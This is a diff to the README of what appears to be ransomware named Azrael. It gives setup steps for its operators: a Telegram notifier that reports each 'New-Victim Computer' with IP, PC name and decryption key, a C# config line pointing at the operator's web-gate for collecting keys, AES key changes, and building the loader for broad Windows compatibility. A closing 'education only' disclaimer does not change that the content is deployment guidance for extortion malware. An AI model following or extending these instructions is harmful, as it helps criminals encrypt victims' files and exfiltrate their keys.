@@ -30,7 +30,7 @@ $botToken = 'YOUR-TELEGRAM-BOT-TOKEN';
 $chatId = 'YOUR-TELEGRAM-CHAT-ID';
 $message = "[🏴‍☠️] New-Victim Computer!\nIP: $API_IP\nPC: $PC\nKey: $key";
  ```
- * And change url to your web-gate:
+ * And change url to your web-gate(src/Azrael_Form/Azrael/Algorithms/config.cs):
  ```csharp
 public static readonly string UrlServer = "http://127.0.0.1/resender.php"; // Your web-gate
  ```
@@ -41,11 +41,10 @@ public static readonly string UrlServer = "http://127.0.0.1/resender.php"; // Yo
 26 File.WriteAllBytes(formPath, Properties.Resources.Form);
 ```
  * After this, compile the loader and the project compilation is complete!.
- * Note: (If you want, you can change the keys to whatever you want).
-
+ * Note: (If you want, you can change the AES keys to your own).
 
  ### 🕸️ Notation (if ):
- > If you decide to rewrite this project, you will need .net framework 4.
+ > If you decide to rewrite this project, you will need .net framework 4 so that the application can run on multiple versions windows.
 
 ## ⚠️ Disclaimer - this project for education and purposes only!
 ```
